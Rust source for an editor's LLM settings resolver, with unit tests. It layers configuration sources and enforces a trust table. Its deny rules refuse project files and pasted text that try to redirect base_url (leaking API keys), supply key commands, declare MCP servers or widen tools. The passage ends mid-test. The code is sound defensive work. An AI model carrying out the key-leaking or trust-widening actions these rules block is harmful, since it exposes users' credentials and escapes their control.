//! Layered settings and the trust table (design §4).
//!
//! A request's settings come from layers, lowest to highest: **defaults, global
//! config, profile, project, session, request.** [`resolve`] folds them into one
//! [`Settings`] and records which layer each value came from, as the
//! [`OptionOrigin`] `:set llm.model?` already prints for options.
//!
//! # Trust is enforced here
//!
//! Some layers are not necessarily the user: a project's `.lattice/llm.toml` can
//! arrive in a cloned repository, and a profile name pasted into a prompt can
//! arrive in pasted text. [`resolve`] applies the design's trust table to those
//! layers itself, so a caller cannot forget to. A key a source may not set is
//! **refused with a message that names the key and the source**, and the rest of
//! that source still applies: one bad key must not discard a file's good ones.
//!
//! | Source | May set | Refused |
//! |---|---|---|
//! | global config, profile, session (`:setlocal`), request by the user | everything | none |
//! | project config | model, system (inline), parameters, narrower tools | `base_url`, key sources, wider tools, trust, MCP servers, providers, profiles |
//! | a profile named in a prompt | model, system, parameters, narrower tools | the rest |
//!
//! Narrower means a subset of the tools in force below the layer. With no tool
//! set below, the effective set is empty, so a project cannot switch a tool on.
//!
//! # Empty is unset
//!
//! Every session option's empty value means "not set at this layer"
//! (see [`super::options`]), so a layer contributes only the keys it has.

use std::collections::{BTreeMap, BTreeSet};

use lattice_config::{OptionOrigin, ResolvedOptions};
use lattice_core::BufferId;

use crate::conversation::FoldDisplay;

/// One resolvable setting. The same set backs the `llm.*` options, the keys a
/// profile or project file may carry and the rows of `:llm-menu` (LL.8).
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash)]
pub enum SettingKey {
    Model,
    System,
    Temperature,
    MaxTokens,
    Reasoning,
    Messages,
    Tools,
    Destination,
    FoldReasoning,
    FoldTools,
    Profile,
}

impl SettingKey {
    pub const ALL: [SettingKey; 11] = [
        Self::Model,
        Self::System,
        Self::Temperature,
        Self::MaxTokens,
        Self::Reasoning,
        Self::Messages,
        Self::Tools,
        Self::Destination,
        Self::FoldReasoning,
        Self::FoldTools,
        Self::Profile,
    ];

    /// The option's canonical name (`llm.model`).
    pub fn option_name(self) -> &'static str {
        match self {
            Self::Model => "llm.model",
            Self::System => "llm.system",
            Self::Temperature => "llm.temperature",
            Self::MaxTokens => "llm.max_tokens",
            Self::Reasoning => "llm.reasoning",
            Self::Messages => "llm.messages",
            Self::Tools => "llm.tools",
            Self::Destination => "llm.destination",
            Self::FoldReasoning => "llm.fold.reasoning",
            Self::FoldTools => "llm.fold.tools",
            Self::Profile => "llm.profile",
        }
    }

    /// The key as a profile or project file spells it (`model`, `max_tokens`).
    /// Only the keys a file may carry have one.
    fn file_key(self) -> Option<&'static str> {
        Some(match self {
            Self::Model => "model",
            Self::System => "system",
            Self::Temperature => "temperature",
            Self::MaxTokens => "max_tokens",
            Self::Reasoning => "reasoning",
            Self::Messages => "messages",
            Self::Tools => "tools",
            Self::Destination => "destination",
            Self::FoldReasoning | Self::FoldTools | Self::Profile => return None,
        })
    }

    /// The key a profile or project file spells `name` as.
    pub fn from_file_key(name: &str) -> Option<Self> {
        Self::ALL.into_iter().find(|k| k.file_key() == Some(name))
    }

    /// The key an option name (`llm.model`) is.
    pub fn from_option_name(name: &str) -> Option<Self> {
        Self::ALL.into_iter().find(|k| k.option_name() == name)
    }

    fn is_parameter(self) -> bool {
        matches!(
            self,
            Self::Temperature | Self::MaxTokens | Self::Reasoning | Self::Messages
        )
    }
}

impl std::fmt::Display for SettingKey {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.write_str(self.option_name())
    }
}

/// The text of each key a layer sets. Absent means the layer has no opinion.
pub type RawSet = BTreeMap<SettingKey, String>;

// ---------------------------------------------------------------------------
// Validation: one definition for options, profiles and project files.
// ---------------------------------------------------------------------------

/// Check `value` for `key`. Empty is always valid (it means "unset"). The
/// message is the one `:setlocal` echoes, so it says what is acceptable.
pub fn validate(key: SettingKey, value: &str) -> Result<(), String> {
    let v = value.trim();
    if v.is_empty() {
        return Ok(());
    }
    let one_of = |allowed: &[&str]| -> Result<(), String> {
        if allowed.contains(&v) {
            Ok(())
        } else {
            Err(format!(
                "{} must be one of {}, not `{v}`",
                key.option_name(),
                allowed.join(", ")
            ))
        }
    };
    match key {
        SettingKey::Model => {
            if v.chars().any(char::is_whitespace) {
                Err(format!("llm.model must not contain spaces, not `{v}`"))
            } else {
                Ok(())
            }
        }
        SettingKey::System => Ok(()),
        SettingKey::Temperature => match v.parse::<f32>() {
            Ok(t) if (0.0..=2.0).contains(&t) => Ok(()),
            _ => Err(format!("llm.temperature must be 0 to 2, not `{v}`")),
        },
        SettingKey::MaxTokens => match v.parse::<i64>() {
            Ok(n) if (0..=10_000_000).contains(&n) => Ok(()),
            _ => Err(format!(
                "llm.max_tokens must be 0 (provider default) to 10000000, not `{v}`"
            )),
        },
        SettingKey::Reasoning => one_of(&["off", "low", "medium", "high"]),
        SettingKey::Messages => {
            if matches!(v, "all" | "last") || v.parse::<usize>().is_ok_and(|n| n > 0) {
                Ok(())
            } else {
                Err(format!(
                    "llm.messages must be all, last or a positive number, not `{v}`"
                ))
            }
        }
        SettingKey::Tools => {
            if v == "none" {
                return Ok(());
            }
            let ok = v.split(',').map(str::trim).all(|t| {
                !t.is_empty()
                    && t.chars().all(|c| {
                        c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | ':' | '.' | '*')
                    })
            });
            if ok {
                Ok(())
            } else {
                Err(format!(
                    "llm.tools must be `none` or comma-separated tool selectors (`lattice.read`, `github.*`), not `{v}`"
                ))
            }
        }
        // Or a chat buffer's name, to continue that chat (`*llm:foo.rs:2*`).
        SettingKey::Destination if is_buffer_name(v) => Ok(()),
        SettingKey::Destination => one_of(&["chat", "below", "review", "register", "echo"])
            .map_err(|e| format!("{e}, or a chat's buffer name (`*llm:3*`)")),
        SettingKey::FoldReasoning | SettingKey::FoldTools => one_of(&["closed", "open", "hidden"]),
        SettingKey::Profile => {
            if v.chars()
                .all(|c| c.is_alphanumeric() || matches!(c, '-' | '_'))
            {
                Ok(())
            } else {
                Err(format!(
                    "llm.profile must be letters, digits, - and _, not `{v}`"
                ))
            }
        }
    }
}

/// `tools` text as a set: `None` for unset, `Some(empty)` for `none`.
pub fn parse_tools(text: &str) -> Option<BTreeSet<String>> {
    let t = text.trim();
    if t.is_empty() {
        return None;
    }
    if t == "none" {
        return Some(BTreeSet::new());
    }
    Some(
        t.split(',')
            .map(|s| s.trim().to_string())
            .filter(|s| !s.is_empty())
            .collect(),
    )
}

/// True for a system prompt that names a file rather than being text.
pub fn system_is_path(s: &str) -> bool {
    let s = s.trim();
    !s.contains('\n') && (s.starts_with('/') || s.starts_with("~/") || s.starts_with("./"))
}

// ---------------------------------------------------------------------------
// Resolved values
// ---------------------------------------------------------------------------

/// How much history a request sends.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Default)]
pub enum MessageScope {
    #[default]
    All,
    /// Only the final user message.
    Last,
    /// The last `n` messages.
    Trailing(usize),
}

impl MessageScope {
    /// The text [`parse`](Self::parse) reads back as this scope.
    fn text(self) -> String {
        match self {
            Self::All => "all".to_string(),
            Self::Last => "last".to_string(),
            Self::Trailing(n) => n.to_string(),
        }
    }

    fn parse(s: &str) -> Self {
        match s.trim() {
            "last" => Self::Last,
            "" | "all" => Self::All,
            n => n.parse().map_or(Self::All, Self::Trailing),
        }
    }

    /// Trim `history` to the scope. Never leaves a leading non-user message,
    /// which providers reject.
    pub fn apply<T: Clone>(self, history: &[T], is_user: impl Fn(&T) -> bool) -> Vec<T> {
        let from = match self {
            Self::All => 0,
            Self::Last => history.iter().rposition(&is_user).unwrap_or(0),
            Self::Trailing(n) => history.len().saturating_sub(n),
        };
        let start = history[from..]
            .iter()
            .position(&is_user)
            .map_or(from, |p| from + p);
        history[start..].to_vec()
    }
}

/// The effective settings of one request or chat.
#[derive(Debug, Clone, PartialEq, Default)]
pub struct Settings {
    /// `provider/model`, or a bare model on the default provider.
    pub model: Option<String>,
    /// Text, or (outside a project) a path to read when the request starts.
    pub system: Option<String>,
    pub temperature: Option<f32>,
    pub max_tokens: Option<u32>,
    pub reasoning: Option<String>,
    pub messages: MessageScope,
    pub tools: BTreeSet<String>,
    pub destination: Option<String>,
    pub fold_reasoning: FoldDisplay,
    pub fold_tools: FoldDisplay,
    pub profile: Option<String>,
}

impl Settings {
    /// LL.20: `key`'s value as the text [`set`](Self::set) reads back, `None`
    /// when unset. A session file keeps a chat's effective settings this way,
    /// so a model that came from a profile comes back without the profile.
    pub fn text(&self, key: SettingKey) -> Option<String> {
        match key {
            SettingKey::Model => self.model.clone(),
            SettingKey::System => self.system.clone(),
            SettingKey::Temperature => self.temperature.map(|t| t.to_string()),
            SettingKey::MaxTokens => self.max_tokens.map(|n| n.to_string()),
            SettingKey::Reasoning => self.reasoning.clone(),
            SettingKey::Messages => Some(self.messages.text()),
            SettingKey::Tools => Some(if self.tools.is_empty() {
                "none".to_string()
            } else {
                self.tools.iter().cloned().collect::<Vec<_>>().join(",")
            }),
            SettingKey::Destination => self.destination.clone(),
            SettingKey::FoldReasoning | SettingKey::FoldTools => None,
            SettingKey::Profile => self.profile.clone(),
        }
    }

    fn set(&mut self, key: SettingKey, text: &str) {
        let t = text.trim();
        let some = || (!t.is_empty()).then(|| t.to_string());
        match key {
            SettingKey::Model => self.model = some(),
            SettingKey::System => self.system = (!text.trim().is_empty()).then(|| text.to_string()),
            SettingKey::Temperature => self.temperature = t.parse().ok(),
            SettingKey::MaxTokens => {
                self.max_tokens = t.parse::<u32>().ok().filter(|n| *n > 0);
            }
            SettingKey::Reasoning => self.reasoning = some(),
            SettingKey::Messages => self.messages = MessageScope::parse(t),
            SettingKey::Tools => self.tools = parse_tools(t).unwrap_or_default(),
            SettingKey::Destination => self.destination = some(),
            SettingKey::FoldReasoning => {
                self.fold_reasoning = FoldDisplay::parse(t).unwrap_or_default();
            }
            SettingKey::FoldTools => self.fold_tools = FoldDisplay::parse(t).unwrap_or_default(),
            SettingKey::Profile => self.profile = some(),
        }
    }
}

/// A key a source set that the trust table does not allow it to.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Refusal {
    /// The key as the source spelled it.
    pub key: String,
    /// Where it came from: a path, `project config`, `a prompt`.
    pub source: String,
    pub reason: String,
}

impl std::fmt::Display for Refusal {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(
            f,
            "llm: refused `{}` from {}: {} (the rest of it still applies)",
            self.key, self.source, self.reason
        )
    }
}

#[derive(Debug, Clone, PartialEq)]
pub struct Resolved {
    pub values: Settings,
    /// The layer each key's value came from. A key nothing set is `Default`.
    pub origins: BTreeMap<SettingKey, OptionOrigin>,
    /// Keys that came from the request itself (the layer above the session).
    pub from_request: BTreeSet<SettingKey>,
    /// What the trust table refused. Callers surface these.
    pub refused: Vec<Refusal>,
}

#[derive(Debug, Clone, PartialEq, Eq, thiserror::Error)]
pub enum SettingsError {
    #[error("unknown profile `{name}`{}", known_list(.known))]
    UnknownProfile { name: String, known: Vec<String> },
}

fn known_list(known: &[String]) -> String {
    if known.is_empty() {
        " (no profiles are configured: add [llm.profiles.<name>] to lattice.toml)".to_string()
    } else {
        format!(" (known: {})", known.join(", "))
    }
}

// ---------------------------------------------------------------------------
// Layers
// ---------------------------------------------------------------------------

/// A project's `.lattice/llm.toml`, as parsed text. It is flattened but NOT
/// filtered: [`resolve`] applies the trust table, so the parser cannot be the
/// place a refusal is forgotten.
#[derive(Debug, Clone, PartialEq, Default)]
pub struct ProjectLayer {
    /// Shown in refusal messages (`.lattice/llm.toml`).
    pub source: String,
    /// `(key, text)` in file order. A nested table is flattened to a dotted key
    /// (`providers.x.base_url`), an array to a comma list.
    pub entries: Vec<(String, String)>,
    /// What the project adds to the safety lists (design §6 "Safety lists"):
    /// lifted out whole, since a pattern or rule may hold a comma the flat
    /// text would split on. Only additions: nothing here can remove an entry.
    pub lists: ProjectLists,
}

/// A project's additions to the `exclude`, `review` and `deny` lists. There is
/// no `allow`: a project may make the model more careful, never less.
#[derive(Debug, Clone, PartialEq, Eq, Default)]
pub struct ProjectLists {
    pub exclude: Vec<String>,
    pub review: Vec<String>,
    pub deny: Vec<String>,
}

/// The keys [`ProjectLists`] takes from a project file.
pub const PROJECT_LIST_KEYS: [&str; 3] = ["exclude", "review", "deny"];

impl ProjectLayer {
    pub fn parse(source: &str, text: &str) -> Result<Self, String> {
        let table: toml::Table = text.parse().map_err(|e| {
            format!(
                "{source} is not valid TOML: {}",
                lattice_config::loader::describe_toml_error(text, &e)
            )
        })?;
        let mut table = table;
        let mut lists = ProjectLists::default();
        for key in PROJECT_LIST_KEYS {
            // Only a list of strings is lifted; anything else stays in the
            // entries, where it is refused with a reason.
            let Some(toml::Value::Array(items)) = table.get(key) else {
                continue;
            };
            let Some(strings) = items
                .iter()
                .map(|v| v.as_str().map(str::to_string))
                .collect::<Option<Vec<String>>>()
            else {
                continue;
            };
            table.remove(key);
            match key {
                "exclude" => lists.exclude = strings,
                "review" => lists.review = strings,
                _ => lists.deny = strings,
            }
        }
        let mut entries = Vec::new();
        flatten("", &table, &mut entries);
        Ok(Self {
            source: source.to_string(),
            entries,
            lists,
        })
    }
}

fn flatten(prefix: &str, table: &toml::Table, out: &mut Vec<(String, String)>) {
    for (k, v) in table {
        let key = if prefix.is_empty() {
            k.clone()
        } else {
            format!("{prefix}.{k}")
        };
        match v {
            toml::Value::Table(t) => {
                if t.is_empty() {
                    out.push((key, String::new()));
                } else {
                    flatten(&key, t, out);
                }
            }
            other => out.push((key, value_text(other))),
        }
    }
}

/// A TOML value as option text.
pub fn value_text(v: &toml::Value) -> String {
    match v {
        toml::Value::String(s) => s.clone(),
        toml::Value::Integer(i) => i.to_string(),
        toml::Value::Float(f) => f.to_string(),
        toml::Value::Boolean(b) => b.to_string(),
        toml::Value::Array(items) => {
            let parts: Vec<String> = items.iter().map(value_text).collect();
            if parts.is_empty() {
                "none".to_string()
            } else {
                parts.join(",")
            }
        }
        other => other.to_string(),
    }
}

/// Parse a profile's table (from the user's own config, so trusted). A bad key
/// or value is skipped with a warning; the rest of the profile survives.
pub fn parse_profile(name: &str, table: &toml::Table, warnings: &mut Vec<String>) -> RawSet {
    let mut set = RawSet::new();
    for (k, v) in table {
        let Some(key) = SettingKey::from_file_key(k) else {
            warnings.push(format!("llm: profile `{name}`: unknown key `{k}`"));
            continue;
        };
        let text = value_text(v);
        match validate(key, &text) {
            Ok(()) => {
                set.insert(key, text);
            }
            Err(e) => warnings.push(format!("llm: profile `{name}`: {e}")),
        }
    }
    set
}

/// Every layer [`resolve`] reads. Cheap to build and cloned per request, so a
/// request holds one consistent view of all of them.
#[derive(Debug, Clone, Default)]
pub struct Layers {
    pub global: RawSet,
    pub profiles: BTreeMap<String, RawSet>,
    /// The profile a session with none of its own starts from.
    pub default_profile: Option<String>,
    pub project: Option<ProjectLayer>,
    /// Buffer-local overrides (`:setlocal`), per buffer.
    pub sessions: BTreeMap<BufferId, RawSet>,
}

/// Who is speaking for the request layer.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Trust {
    /// The user, through the menu, a command argument or an ex-command.
    User,
    /// Text that may be pasted (`@profile` in a prompt).
    Pasted,
}

/// Overrides for one request: command arguments, or a pasted `@profile`.
#[derive(Debug, Clone, Default)]
pub struct RequestOverrides {
    /// A profile named for this request only.
    pub profile: Option<String>,
    /// The profile came from text that may have been pasted (an `@profile`
    /// cookie), whoever speaks for the rest of the request. The profile then
    /// applies through the restricted path while `values` (a menu choice or a
    /// command argument, the user's own) keep their full trust.
    pub pasted_profile: bool,
    pub values: RawSet,
}

/// Settings keys a restricted source (project config, a pasted profile) may set.
fn restricted_may_set(key: SettingKey) -> bool {
    matches!(
        key,
        SettingKey::Model | SettingKey::System | SettingKey::Tools
    ) || key.is_parameter()
}

/// LL.20: the keys a session file keeps: the ones a restricted source may set,
/// so everything saved can come back.
pub const SAVED_KEYS: [SettingKey; 7] = [
    SettingKey::Model,
    SettingKey::System,
    SettingKey::Temperature,
    SettingKey::MaxTokens,
    SettingKey::Reasoning,
    SettingKey::Messages,
    SettingKey::Tools,
];

/// The spelling a file uses for `key` (`max_tokens`), for keys a file may carry.
pub fn file_key(key: SettingKey) -> Option<&'static str> {
    key.file_key()
}

/// LL.20: a session file's settings through the trust table, as project config
/// goes: it may have been downloaded, so it may set the model, the system
/// prompt (as text), parameters and tools no wider than `base_tools`, the
/// ones the user's own config enables. Everything else is refused, with why.
pub fn restrict(
    entries: impl Iterator<Item = (String, String)>,
    source: &str,
    base_tools: BTreeSet<String>,
) -> (RawSet, Vec<Refusal>) {
    let mut refused = Vec::new();
    let mut tools = Some(base_tools);
    let set = apply_restricted(entries, source, &mut tools, &mut refused);
    (set, refused)
}

/// Reasons for the keys the table names, so the message says why and not only no.
fn named_refusal(key: &str) -> Option<&'static str> {
    let first = key.split('.').next().unwrap_or(key);
    match first {
        "base_url" => {
            Some("a project may not redirect requests, which would send your key to its server")
        }
        "api_key" | "api_key_env" | "api_key_command" => {
            Some("key sources come from your own config only; a project could run a command")
        }
        "trust" => Some("a project may not widen its own trust"),
        "mcp" | "mcp_servers" => {
            Some("a project may not declare MCP servers: a stdio server is a command to run")
        }
        "providers" | "provider" => {
            Some("providers (and their base_url and key sources) come from your own config only")
        }
        "profiles" | "profile" => Some("a project may not define profiles, which can widen tools"),
        "allow" => Some(
            "a project may not allow anything to run unasked; it can only add to exclude, \
             review and deny",
        ),
        "exclude" | "review" | "deny" => {
            Some("must be a list of strings (gitignore patterns or rules)")
        }
        _ => None,
    }
}

/// Fold a restricted source into `acc`. Returns the keys it applied.
fn apply_restricted(
    entries: impl Iterator<Item = (String, String)>,
    source: &str,
    effective_tools: &mut Option<BTreeSet<String>>,
    refused: &mut Vec<Refusal>,
) -> RawSet {
    let mut out = RawSet::new();
    for (name, text) in entries {
        let refuse = |reason: String, refused: &mut Vec<Refusal>| {
            refused.push(Refusal {
                key: name.clone(),
                source: source.to_string(),
                reason,
            });
        };
        if let Some(why) = named_refusal(&name) {
            refuse(why.to_string(), refused);
            continue;
        }
        let Some(key) = SettingKey::from_file_key(&name).filter(|k| restricted_may_set(*k)) else {
            let why = if SettingKey::from_file_key(&name).is_some() {
                "this source may set the model, system prompt, parameters and narrower tools only"
            } else {
                "not a setting this source may carry"
            };
            refuse(why.to_string(), refused);
            continue;
        };
        if let Err(e) = validate(key, &text) {
            refuse(e, refused);
            continue;
        }
        match key {
            SettingKey::System if system_is_path(&text) => {
                refuse(
                    "a system prompt here must be text, not a file path, so config from outside \
                     cannot make the editor read a file"
                        .to_string(),
                    refused,
                );
                continue;
            }
            SettingKey::Tools => {
                let asked = parse_tools(&text).unwrap_or_default();
                let allowed = effective_tools.clone().unwrap_or_default();
                let wider: Vec<&String> = asked.difference(&allowed).collect();
                if !wider.is_empty() {
                    let names: Vec<&str> = wider.iter().map(|s| s.as_str()).collect();
                    refuse(
                        format!(
                            "wider than the tools already enabled ({}); this source may only narrow",
                            names.join(", ")
                        ),
                        refused,
                    );
                    continue;
                }
                *effective_tools = Some(asked);
            }
            _ => {}
        }
        out.insert(key, text);
    }
    out
}

/// The fold in progress: values, where each came from, and the tool set in force
/// so far (what the next restricted layer may narrow).
struct Acc {
    values: Settings,
    origins: BTreeMap<SettingKey, OptionOrigin>,
    tools: Option<BTreeSet<String>>,
}

impl Acc {
    fn apply(&mut self, set: &RawSet, origin: OptionOrigin) {
        for (key, text) in set {
            if *key == SettingKey::Profile || text.trim().is_empty() {
                continue;
            }
            self.values.set(*key, text);
            self.origins.insert(*key, origin.clone());
            if *key == SettingKey::Tools {
                self.tools = parse_tools(text);
            }
        }
    }
}

/// Resolve the settings for a request from `buffer`.
///
/// `trust` says who is speaking for `req`. See the module docs for the table
/// this enforces.
pub fn resolve(
    layers: &Layers,
    buffer: BufferId,
    req: &RequestOverrides,
    trust: Trust,
) -> Result<Resolved, SettingsError> {
    let mut acc = Acc {
        values: Settings::default(),
        origins: SettingKey::ALL
            .into_iter()
            .map(|k| (k, OptionOrigin::Default))
            .collect(),
        tools: None,
    };
    let mut refused = Vec::new();

    let empty = RawSet::new();
    let session = layers.sessions.get(&buffer).unwrap_or(&empty);

    // The profile is chosen before the layers are folded: a request's, else the
    // session's, else the global default. A profile named by the request is an
    // explicit ask for this turn, so it applies at the request layer (5), above
    // the session's own overrides; the base profile (2) is then not applied, as
    // the request's replaces it.
    let base_profile = session
        .get(&SettingKey::Profile)
        .cloned()
        .or_else(|| layers.global.get(&SettingKey::Profile).cloned())
        .or_else(|| layers.default_profile.clone())
        .filter(|p| !p.trim().is_empty());
    let request_profile = req.profile.clone().filter(|p| !p.trim().is_empty());
    let profile_name = request_profile.clone().or(base_profile.clone());
    let lookup = |name: &String| {
        layers
            .profiles
            .get(name)
            .ok_or_else(|| SettingsError::UnknownProfile {
                name: name.clone(),
                known: layers.profiles.keys().cloned().collect(),
            })
    };
    let request_profile_set = match &request_profile {
        None => None,
        Some(name) => Some(lookup(name)?),
    };
    let base_profile_set = match (&request_profile, &base_profile) {
        (None, Some(name)) => Some(lookup(name)?),
        _ => None,
    };

    // 1. global config
    acc.apply(&layers.global, OptionOrigin::GlobalConfig);
    // 2. profile
    if let (Some(name), Some(set)) = (&base_profile, base_profile_set) {
        acc.apply(set, OptionOrigin::Profile { name: name.clone() });
    }
    // 3. project, through the trust table
    if let Some(project) = &layers.project {
        let kept = apply_restricted(
            project.entries.iter().cloned(),
            &project.source,
            &mut acc.tools,
            &mut refused,
        );
        acc.apply(&kept, OptionOrigin::Project);
    }
    // 4. session
    acc.apply(session, OptionOrigin::BufferLocal);
    // 5. request: the profile it names, then its own values.
    if let (Some(name), Some(set)) = (&request_profile, request_profile_set) {
        let origin = OptionOrigin::Profile { name: name.clone() };
        // A profile named by pasted text is still pasted text: it may narrow
        // tools but not widen them, whatever the profile itself carries.
        if trust == Trust::Pasted || req.pasted_profile {
            let entries = set
                .iter()
                .filter_map(|(k, v)| k.file_key().map(|n| (n.to_string(), v.clone())));
            let kept = apply_restricted(entries, "a prompt", &mut acc.tools, &mut refused);
            acc.apply(&kept, origin);
        } else {
            acc.apply(set, origin);
        }
    }
    let request_set: RawSet = match trust {
        Trust::User => req.values.clone(),
        Trust::Pasted => {
            let entries = req
                .values
                .iter()
                .filter_map(|(k, v)| k.file_key().map(|n| (n.to_string(), v.clone())));
            apply_restricted(entries, "a prompt", &mut acc.tools, &mut refused)
        }
    };
    let from_request: BTreeSet<SettingKey> = request_set.keys().copied().collect();
    acc.apply(&request_set, OptionOrigin::BufferLocal);

    let Acc {
        mut values,
        origins,
        ..
    } = acc;
    values.profile = profile_name;
    Ok(Resolved {
        values,
        origins,
        from_request,
        refused,
    })
}

// ---------------------------------------------------------------------------
// Reading option snapshots
// ---------------------------------------------------------------------------

/// The keys a buffer sets at the session layer, from its resolved options: those
/// whose winning layer is `:setlocal` and whose value is non-empty.
pub fn session_set(options: &ResolvedOptions) -> RawSet {
    use super::options::{
        LlmFoldReasoning, LlmFoldTools, LlmMaxTokens, LlmMessages, LlmModel, LlmProfile,
        LlmReasoning, LlmSystem, LlmTemperature, LlmTools,
    };
    use lattice_config::OptionDecl;

    fn text<D: OptionDecl<Value = String>>(o: &ResolvedOptions) -> Option<String> {
        (o.get_origin::<D>() == OptionOrigin::BufferLocal)
            .then(|| o.get::<D>().map(|v| (*v).clone()))
            .flatten()
            .filter(|v| !v.trim().is_empty())
    }
    let mut out = RawSet::new();
    let mut put = |k: SettingKey, v: Option<String>| {
        if let Some(v) = v {
            out.insert(k, v);
        }
    };
    put(SettingKey::Model, text::<LlmModel>(options));
    put(SettingKey::System, text::<LlmSystem>(options));
    put(SettingKey::Temperature, text::<LlmTemperature>(options));
    put(SettingKey::Reasoning, text::<LlmReasoning>(options));
    put(SettingKey::Messages, text::<LlmMessages>(options));
    put(SettingKey::Tools, text::<LlmTools>(options));
    put(
        SettingKey::Destination,
        text::<super::options::LlmDestination>(options),
    );
    put(SettingKey::FoldReasoning, text::<LlmFoldReasoning>(options));
    put(SettingKey::FoldTools, text::<LlmFoldTools>(options));
    put(SettingKey::Profile, text::<LlmProfile>(options));
    if options.get_origin::<LlmMaxTokens>() == OptionOrigin::BufferLocal
        && let Some(n) = options.get::<LlmMaxTokens>().filter(|n| **n > 0)
    {
        out.insert(SettingKey::MaxTokens, n.to_string());
    }
    out
}

/// The keys the global registry holds a value for.
pub fn global_set(registry: &lattice_config::ConfigRegistry) -> RawSet {
    use super::options::{
        LlmDefaultProfile, LlmDestination, LlmFoldReasoning, LlmFoldTools, LlmMaxTokens,
        LlmMessages, LlmModel, LlmProfile, LlmReasoning, LlmSystem, LlmTemperature, LlmTools,
    };
    use lattice_config::OptionDecl;

    fn text<D: OptionDecl<Value = String>>(r: &lattice_config::ConfigRegistry) -> Option<String> {
        r.get_typed::<D>()
            .map(|v| (*v).clone())
            .filter(|v| !v.trim().is_empty())
    }
    let mut out = RawSet::new();
    let mut put = |k: SettingKey, v: Option<String>| {
        if let Some(v) = v {
            out.insert(k, v);
        }
    };
    put(SettingKey::Model, text::<LlmModel>(registry));
    put(SettingKey::System, text::<LlmSystem>(registry));
    put(SettingKey::Temperature, text::<LlmTemperature>(registry));
    put(SettingKey::Reasoning, text::<LlmReasoning>(registry));
    put(SettingKey::Messages, text::<LlmMessages>(registry));
    put(SettingKey::Tools, text::<LlmTools>(registry));
    put(SettingKey::Destination, text::<LlmDestination>(registry));
    put(
        SettingKey::FoldReasoning,
        text::<LlmFoldReasoning>(registry),
    );
    put(SettingKey::FoldTools, text::<LlmFoldTools>(registry));
    // `llm.profile` set globally acts as the default; `llm.default_profile` is
    // the documented spelling and wins.
    put(
        SettingKey::Profile,
        text::<LlmDefaultProfile>(registry).or_else(|| text::<LlmProfile>(registry)),
    );
    if let Some(n) = registry.get_typed::<LlmMaxTokens>().filter(|n| **n > 0) {
        out.insert(SettingKey::MaxTokens, n.to_string());
    }
    out
}

/// Whether a `destination` value names a buffer (`*llm:3*`) rather than a kind
/// of destination.
pub fn is_buffer_name(v: &str) -> bool {
    v.len() > 2 && v.starts_with('*') && v.ends_with('*')
}

#[cfg(test)]
mod tests {
    #![allow(clippy::unwrap_used)]
    use super::*;

    const BUF: BufferId = BufferId(7);

    fn set(pairs: &[(SettingKey, &str)]) -> RawSet {
        pairs.iter().map(|(k, v)| (*k, v.to_string())).collect()
    }

    fn layers() -> Layers {
        let mut l = Layers::default();
        l.global = set(&[
            (SettingKey::Model, "g-model"),
            (SettingKey::Temperature, "0.9"),
        ]);
        l.profiles.insert(
            "writer".into(),
            set(&[
                (SettingKey::Model, "p-model"),
                (SettingKey::System, "be terse"),
                (SettingKey::Tools, "read"),
            ]),
        );
        l
    }

    fn run(l: &Layers, req: &RequestOverrides, trust: Trust) -> Resolved {
        resolve(l, BUF, req, trust).unwrap()
    }

    fn origin(r: &Resolved, k: SettingKey) -> OptionOrigin {
        r.origins[&k].clone()
    }

    /// A profile named for one request is an explicit request for that turn: its
    /// values sit above the session's own overrides, restricted or not.
    #[test]
    fn a_profile_named_for_the_request_beats_session_overrides() {
        let mut l = layers();
        l.sessions
            .insert(BUF, set(&[(SettingKey::Model, "s-model")]));
        let req = RequestOverrides {
            profile: Some("writer".into()),
            ..Default::default()
        };
        for pasted in [false, true] {
            let req = RequestOverrides {
                pasted_profile: pasted,
                ..req.clone()
            };
            let r = run(&l, &req, Trust::User);
            assert_eq!(
                r.values.model.as_deref(),
                Some("p-model"),
                "pasted={pasted}"
            );
            assert_eq!(
                origin(&r, SettingKey::Model),
                OptionOrigin::Profile {
                    name: "writer".into()
                }
            );
        }
        // Without it the session still wins over the same profile held as the base.
        l.default_profile = Some("writer".into());
        let r = run(&l, &RequestOverrides::default(), Trust::User);
        assert_eq!(r.values.model.as_deref(), Some("s-model"));
    }

    /// The request layer is still the user's last word: a menu or argument value
    /// beats the profile named in the same request.
    #[test]
    fn request_values_beat_the_request_profile() {
        let req = RequestOverrides {
            profile: Some("writer".into()),
            values: set(&[(SettingKey::Model, "arg-model")]),
            ..Default::default()
        };
        let r = run(&layers(), &req, Trust::User);
        assert_eq!(r.values.model.as_deref(), Some("arg-model"));
    }

    #[test]
    fn a_request_profile_under_pasted_trust_still_cannot_widen_tools() {
        let mut l = layers();
        l.profiles.insert(
            "wide".into(),
            set(&[(SettingKey::Model, "w"), (SettingKey::Tools, "exec")]),
        );
        let req = RequestOverrides {
            profile: Some("wide".into()),
            pasted_profile: true,
            ..Default::default()
        };
        let r = run(&l, &req, Trust::User);
        assert_eq!(r.values.model.as_deref(), Some("w"));
        assert!(r.values.tools.is_empty(), "{:?}", r.values.tools);
    }

    #[test]
    fn nothing_set_is_all_default() {
        let r = run(
            &Layers::default(),
            &RequestOverrides::default(),
            Trust::User,
        );
        assert_eq!(r.values, Settings::default());
        assert!(r.origins.values().all(|o| *o == OptionOrigin::Default));
    }

    #[test]
    fn each_layer_beats_the_one_below_it() {
        let mut l = layers();
        l.default_profile = Some("writer".into());
        l.project =
            Some(ProjectLayer::parse(".lattice/llm.toml", "model = \"proj-model\"\n").unwrap());
        // global < profile
        let r = run(
            &Layers {
                project: None,
                ..l.clone()
            },
            &RequestOverrides::default(),
            Trust::User,
        );
        assert_eq!(r.values.model.as_deref(), Some("p-model"));
        assert_eq!(
            origin(&r, SettingKey::Model),
            OptionOrigin::Profile {
                name: "writer".into()
            }
        );
        // global stays where the profile is silent
        assert_eq!(r.values.temperature, Some(0.9));
        assert_eq!(
            origin(&r, SettingKey::Temperature),
            OptionOrigin::GlobalConfig
        );
        // profile < project
        let r = run(&l, &RequestOverrides::default(), Trust::User);
        assert_eq!(r.values.model.as_deref(), Some("proj-model"));
